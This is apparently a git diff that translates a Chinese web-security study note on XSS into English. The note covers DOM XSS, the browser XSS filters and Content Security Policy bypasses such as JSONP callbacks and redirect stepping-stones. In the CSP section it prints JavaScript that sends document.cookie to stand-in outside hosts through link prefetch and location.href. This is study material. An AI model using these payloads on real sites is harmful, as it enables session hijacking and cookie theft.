@@ -9,6 +9,7 @@ Forum or mail board, insert script into the content.
 
 3. DOM xss: 最近の流行り  
 DOM XSS is different from reflected xss and stored xss. It based on **source** and **sink** which we can run dynamically on the client side.  
+
 Here are three kinds of common sinks:  
 1. document sink  
 ```js
@@ -110,22 +111,22 @@ special chars are converted to pure string and close the `value` attribute
 2. If you can control the content encoding type, you can try such as UTF-7
 
 # XSS Auditor Intro and bypass
-XSS是chrome上面專門對付**Reflected XSS**的第三方防禦手段[XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
-這邊順便提一下三個瀏覽器XSS filter的工作原理：  
-1. IE XSS filter: 用正則取代request或response中的危險字元  
-2. Chrome XSS Auditor: 檢查request或reponse中的危險字元，**若放入HTML架構有危險再刪除**  
-3. Firefox Noscript: 只檢查request中的危險字元
+XSS Auditor is specific defense toward **Reflected XSS** on Chrome. -- [XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
+Here I will talk about the XSS filter in three browsers：  
+1. IE XSS filter: replace dangerous character in request or response with regex  
+2. Chrome XSS Auditor: check dangerous character in requst or response,**filter it only when it dangerous after putting into the page**.  
+3. Firefox Noscript: Only check the dangerous character in request
 ```
 // disable
 X-XSS-Protection: 0
 
-// 單去除危險的頁面部分
+// Only filter the dangerous part
 X-XSS-Protection: 1
 
-// 攔截頁面response並且導向about:blank
+// block the response and redirect to about:blank
 X-XSS-Protection: 1; mode=block
 
-// 將report送到想要的地方
+// redirect report to the place you want
 X-XSS-Protection: 1; mode=block; report=https://example.com/log.cgi
 X-XSS-Protection: 1; report="https://example.com/log.cgi?jsessionid=132;abc"
 ```
@@ -136,52 +137,52 @@ Auditor reference:
 [xss_auditor_delegate.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor_delegate.h)
 
 # CSP Intro and bypass
-從瀏覽器的層面來防禦漏洞[Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
-主要有兩種 1. 限制`js`執行 2. 限制對別的域的請求  
-怎麼看一個網站的CSP呢？  
+Defense from browser side -- [Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
+With two ways 1. limit `js` to execute 2. limit request to other domains  
+How to see whether there is a CSP working on the website？  
 ```php
 curl -I https://github.com/
-// 列出header
-// 我們可以看到github已經開啟了XSS-Protection
-// 並且也能看到CSP的內容
+// list header
+// From results, we can see that github already open the option of XSS-Protection
+// also can see the details of CSP
 Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
 ```
-現在開始解讀CSP  
+Now we focus on the CSP  
 ```php
 header("Content-Security-Policy: default-src 'self '; script-src * ");
 ```
-以上CSP歡迎您加載任何domain的js :-1: ，此外會禁止加載domain外的source
+The CSP above welcome you to load js from any domain :-1: , and stop from loading any source from other domains
 ```php
 header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
 ```
-以上CSP只能讓您加載當前domain下的js，尋找後台上傳內容為js的圖片或文件，`src=upload/1pwnch.js`
+The CSP above only let you load the js from same domain, such as `src=upload/1pwnch.js`
 ```php
 header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
 Content-Security-Policy: script-src 'self' trusted.domain.com
 ```
-以上第一例中CSP只能加載特定資料夾下的js，這時候可以尋找`static/`下有沒有可控的跳轉文件(302)，我們可以把這個文件當作跳板去加載我們上傳的js文件  
-第二例中可以找trusted.domain.com中有沒有可以bypass的script，或者有沒有**jsonp**的利用點，如下：  
+First CSP: we can only load js from static path. In this case, we can find any redirect file under the path of `static/`, control it and redirect to the js file we want.  
+Second CSP: We can find controllable script from trusted.domain.com, or any **jsonp** to exploit it, for example：  
 ```php
 <script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
 ```
-除了jsonp，`Angularjs`也可被用來bypass，因此下面的`strict-dynamic`便顯得更加重要了  
-來看看最常見的CSP  
+In addition to jsonp, `Angularjs` also can be used to bypass the CSP. Therefore, we need `strict-dynamic`.  
+Let's take a look at more CSP  
 ```php
 header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
 ```
-`unsafe-inline`指頁面中直接添加的`<script>`可以被執行，再來便是繞過domain的限制：  
-  1. 用js製造link prefetch  
-     [什麼是prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
-     prefetch下面還有`DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`幾個概念  
-     不是所有source都能預加載的，e.g. ajax，開啟developer tool的頁面    
+`unsafe-inline` means the added `<script>` in the page can execute, then we can bypass the limit of domain with following ways：  
+  1. make link prefetch with js  
+     [what's prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
+     prefetch: `DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`  
+     Not all source can be preloaded, e.g. ajax, open your page of developer tool    
      ```js
-     // 只有chrome可用  
+     // can only be used by chrome  
      var x = document.createElement("link");
      x.setAttribute("rel", "prefetch");
      x.setAttribute("href", "//xxxxx.com/?" + document.cookie);
      document.head.appendChild(x);
      ```
-  2. 跳轉 && 跨域  
+  2. redirect && cross domain  
      跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
      ```js
      <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
